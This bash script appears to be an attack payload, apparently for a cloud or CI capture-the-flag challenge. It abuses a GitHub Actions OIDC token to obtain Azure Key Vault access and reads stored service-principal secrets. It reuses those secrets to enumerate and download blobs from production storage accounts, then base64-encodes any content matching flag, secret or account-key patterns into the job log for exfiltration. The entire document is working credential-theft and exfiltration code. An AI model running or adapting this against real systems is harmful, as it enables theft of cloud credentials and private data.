#!/usr/bin/env bash
set -euo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"; PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'; say(){ echo "$*"; }
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
B=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default' | jq -r '.access_token // empty')
for sp in sync-service-principal secrets-sync-principal reporting-viewer-principal; do
 S=$(curl -sS --max-time 20 -H "Authorization: Bearer $B" "$PROD/secrets/$sp?api-version=7.4"); V=$(echo "$S"|jq -r '.value // empty'); A=$(echo "$V"|jq -r '.appId // empty'); P=$(echo "$V"|jq -r '.clientSecret // empty'); TT=$(echo "$V"|jq -r '.tenantId // empty'); [[ -n "$A" && -n "$P" ]] || continue
 ST=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TT/oauth2/v2.0/token" -d "client_id=$A" -d 'grant_type=client_credentials' -d "client_secret=$P" -d 'scope=https://storage.azure.com/.default' | jq -r '.access_token // empty')
 say "STOR_${sp}=$([[ -n "$ST" ]] && echo OK || echo FAIL)"; [[ -n "$ST" ]] || continue
 for pair in 'sttblappcfgprodx3euoz:config' 'sttblbackupprodx3euoz:exports' 'sttblcilogsprodx3euoz:logs' 'sttblarchiveprodx3euoz:'; do
  acc=${pair%%:*}; cont=${pair##*:}; [[ -n "$cont" ]] || continue; base="https://$acc.blob.core.windows.net/$cont"
  LB=$(curl -sS --max-time 20 -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06' "$base?restype=container&comp=list")
  names=$(echo "$LB"|jq -r '.EnumerationResults.Blobs.Blob[]?.Name' 2>/dev/null||true)
  say "L_${sp}_${acc}_${cont}=$(printf '%s' "$names"|tr '\n' ','|base64 -w0)"
  for bn in $names internal-config.json flag flag.txt export.json credentials.json secrets.json; do
   [[ -n "$bn" ]] || continue
   code=$(curl -sS --max-time 20 -o /tmp/bl -w '%{http_code}' -H "Authorization: Bearer $ST" -H 'x-ms-version: 2021-08-06' "$base/$bn" || echo 000)
   [[ "$code" == "200" ]] || continue
   txt=$(head -c 30000 /tmp/bl|tr -d '\000')
   if echo "$txt"|grep -aqE 'DF26\{|flag|secret|clientSecret|AccountKey|CONFIG_STORAGE'; then say "BLOB_${sp}_${acc}_${cont}_${bn}_B64=$(printf '%s' "$txt"|base64 -w0)"; fi
  done
 done
done
say DONE
